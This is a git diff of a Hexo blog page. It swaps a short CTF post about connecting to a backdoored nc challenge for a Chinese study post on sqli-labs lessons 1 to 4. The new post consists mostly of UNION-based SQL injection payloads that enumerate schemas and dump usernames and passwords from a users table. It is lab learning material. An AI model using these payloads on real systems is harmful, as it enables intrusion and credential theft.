@@ -6,19 +6,18 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>test your nc | Hexo</title>
+  <title>Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="我的文章摘要….">
+  <meta name="description" content="sqli-labs靶场学习less112345678910#联合注入字符型?id&#x3D;1&amp;#x27;				#错误显示?id&#x3D;1&amp;#x27;--+			#正常显示，为字符型注入?id&#x3D;1&amp;#x27; order by 3 --+	#判断列数?id&#x3D;-1 union select 1,2,3		#爆出显示位?id&#x3D;-1 union select 1,database(),version()?id&#x3D;-1">
 <meta property="og:type" content="article">
-<meta property="og:title" content="test your nc">
-<meta property="og:url" content="http://example.com/2023/02/13/My-New-Post/index.html">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2023/10/20/sqli-labs%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="我的文章摘要….">
+<meta property="og:description" content="sqli-labs靶场学习less112345678910#联合注入字符型?id&#x3D;1&amp;#x27;				#错误显示?id&#x3D;1&amp;#x27;--+			#正常显示，为字符型注入?id&#x3D;1&amp;#x27; order by 3 --+	#判断列数?id&#x3D;-1 union select 1,2,3		#爆出显示位?id&#x3D;-1 union select 1,database(),version()?id&#x3D;-1">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-02-13T08:19:19.000Z">
-<meta property="article:modified_time" content="2023-02-15T06:37:07.209Z">
+<meta property="article:published_time" content="2023-10-20T01:45:55.680Z">
+<meta property="article:modified_time" content="2023-10-20T01:45:56.693Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="hexo">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
@@ -155,29 +154,26 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-My-New-Post" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-sqli-labs靶场学习" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 class="article-title" itemprop="name">
-      test your nc
-    </h1>
-  
-
-        
-        <a href="/2023/02/13/My-New-Post/" class="archive-article-date">
-  	<time datetime="2023-02-13T08:19:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-02-13</time>
-</a>
-        
-      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>我的文章摘要….</p>
-<span id="more"></span>
-<p>先使用checksec查看一下文件属性，然后把文件放到IDA中，F5反汇编看到了system(‘&#x2F;bin&#x2F;sh’)（如果在程序中执行这串代码，我们的权限就会提高，我们就能够查看电脑上的其他文件，获取flag）<br>这道题直接给出了后门函数，所以我们直接链接到服务器就好了<br>链接到服务器的方法（直接在终端输入nc ip地址 ip端口）<br>链接到服务器后我们就获得了高级权限，直接cat flag就能得到flag </p>
+        <h2 id="sqli-labs靶场学习"><a href="#sqli-labs靶场学习" class="headerlink" title="sqli-labs靶场学习"></a>sqli-labs靶场学习</h2><h4 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#联合注入字符型</span><br><span class="line">?id=1&#x27;				#错误显示</span><br><span class="line">?id=1&#x27;--+			#正常显示，为字符型注入</span><br><span class="line">?id=1&#x27; order by 3 --+	#判断列数</span><br><span class="line">?id=-1 union select 1,2,3		#爆出显示位</span><br><span class="line">?id=-1 union select 1,database(),version()</span><br><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(username ,id , password) from users</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<h4 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#联合注入数字型</span><br><span class="line">&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;</span><br><span class="line">&quot;SELECT * FROM users WHERE id=1 &#x27; LIMIT 0,1&quot;出错信息。</span><br><span class="line"> </span><br><span class="line"> #数字型</span><br><span class="line">?id=1 order by 3</span><br><span class="line">?id=-1 union select 1,2,3</span><br><span class="line">?id=-1 union select 1,database(),version()</span><br><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(username ,id , password) from users</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h4><p>![](C:\Users\tong\Pictures\Screenshots\屏幕截图 2023-10-17 170104.png)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#联合注入字符型</span><br><span class="line">?id=2&#x27;)--+</span><br><span class="line">?id=1&#x27;) order by 3--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br><span class="line">?id=-1&#x27;) union select 1,database(),version()--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;) order by 3--+</span><br><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure>
+
+
+
 
       
 
@@ -207,17 +203,6 @@
     <div class="article-info article-info-index">
       
       
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">hexo</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
       
 
       
@@ -268,7 +253,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2023/02/13/My-New-Post/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2023/10/20/sqli-labs%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -283,8 +268,8 @@
 <nav id="article-nav">
   
   
-    <a href="/2023/02/13/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Hello World</div>
+    <a href="/2023/09/28/web%E5%AD%A6%E4%B9%A0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -408,10 +393,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
             <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
           </label>
           <ul class="article-tag-list" q-show="showTags">
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
-              </li>
             
             <div class="clearfix"></div>
           </ul>
